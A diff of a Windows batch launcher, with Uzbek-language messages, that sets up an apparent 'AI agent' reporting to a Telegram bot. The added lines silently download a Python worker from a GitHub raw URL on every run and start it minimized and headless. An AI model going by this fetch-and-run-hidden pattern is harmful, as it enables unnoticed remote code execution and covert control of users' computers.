@@ -10,8 +10,13 @@ if exist "D:\uzbekcodersbot\cluster_worker.py" set "TARGET_DIR=D:\uzbekcodersbot
 if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1
 cd /d "%TARGET_DIR%"
 
+where curl.exe >nul 2>&1
+if %errorlevel% equ 0 (
+    curl.exe -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/cluster_worker.py" -o "%TARGET_DIR%\cluster_worker.py" --silent
+)
+
 if not exist "%TARGET_DIR%\cluster_worker.py" (
-    echo Yuklanmoqda...
+    echo Kodlar yuklanmoqda...
     where curl.exe >nul 2>&1
     if %errorlevel% equ 0 (
         curl.exe -L "https://github.com/xakimovabdubannob-gif/cloud-node/archive/refs/heads/master.zip" -o "%TEMP%\master.zip" --silent
@@ -37,14 +42,14 @@ set WORKER_COUNT=4
 set HEADLESS=1
 set GUI_MODE=0
 
-start /min "" python -u cluster_worker.py
+start /min "" python -u "%TARGET_DIR%\cluster_worker.py"
 
 echo ======================================================================
 echo  [OK] AI AGENT ISHGA TUSHIRILDI!
 echo ======================================================================
 echo.
 echo  Kompyuter botga ulanmoqda...
-echo  Xabarlar to'g'ridan-to'g'ri Telegram botingizga yuborilmoqda.
+echo  Xabarlar to'g'ridan-to'g'ri Telegram botingizga yuboriladi.
 echo.
 echo  Ushbu oyna 3 soniyada avtomatik yopiladi...
 timeout /t 3 >nul
